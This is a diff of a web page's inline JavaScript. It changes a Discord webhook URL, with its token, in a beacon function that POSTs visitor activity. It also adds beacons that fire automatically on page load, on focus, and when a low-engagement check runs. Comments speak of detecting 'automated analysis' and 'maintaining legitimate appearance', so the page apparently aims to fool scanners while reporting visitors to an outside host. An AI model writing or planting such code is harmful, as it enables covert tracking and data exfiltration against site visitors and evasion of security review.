@@ -210,7 +210,7 @@
         
         function trackEngagement(action) {
             // Beacon tracking
-            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+            fetch('https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -226,11 +226,24 @@
             }
         }
         
+        // Initial page load beacon
+        window.addEventListener('DOMContentLoaded', function() {
+            trackEngagement('page_load');
+        });
+        
+        // Track page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') {
+                trackEngagement('page_focus');
+            }
+        });
+        
         // Simulate legitimate user behavior
         setTimeout(() => {
             if (userEngagement < 5) {
                 // User hasn't engaged - probably automated analysis
                 console.log('Low engagement detected - maintaining legitimate appearance');
+                trackEngagement('low_engagement_detected');
             }
         }, 10000);
     </script>
